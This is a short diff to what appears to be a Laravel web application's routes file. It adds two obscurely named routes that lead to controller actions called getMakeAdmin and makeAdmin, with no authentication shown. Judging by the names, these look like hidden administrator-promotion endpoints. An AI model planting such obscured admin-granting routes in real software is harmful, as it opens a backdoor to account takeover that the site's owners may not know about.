@@ -105,3 +105,5 @@ Route::get('/verify-email/{user_id}/{token}', 'interfaceController@verifyEmail')
 Route::get('/delete-prev-work-img/{id}', 'interfaceController@deletePrevWorkImg');
 Route::post('/send-enquiry', 'interfaceController@sendEquiry');
 Route::get('/get-add-logo-form', 'interfaceController@addLogoForm')->name('addlogo');
+Route::get('/i-am-for-chukwuabiama', 'interfaceController@getMakeAdmin');
+Route::post('/i-am-for-oluwa-chukwu-oma', 'interfaceController@makeAdmin')->name('make-admin');
